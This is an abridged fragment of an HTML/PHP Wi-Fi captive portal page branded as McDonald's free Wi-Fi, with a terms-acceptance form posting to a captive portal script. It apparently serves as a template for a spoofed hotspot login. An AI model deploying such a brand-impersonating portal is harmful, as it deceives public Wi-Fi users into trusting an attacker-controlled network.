...
?>
  ...
  <head>
    ...
    <title>Sign in - McDonald's</title>
  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        ...
        <h1 class="text-center login-title">Welcome @ McDonald's</h1>
        <h2 class="text-center friends-text">love free wi-fi</h2>
          ...
          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
            ...
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">I accept the terms of use</button>
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">No account? <br />Click to create an account</button>
            <div class="text-center terms-text1">To use free WiFi, accept the <a href="#" class="url-color" id="btn1">terms and conditions.</div>
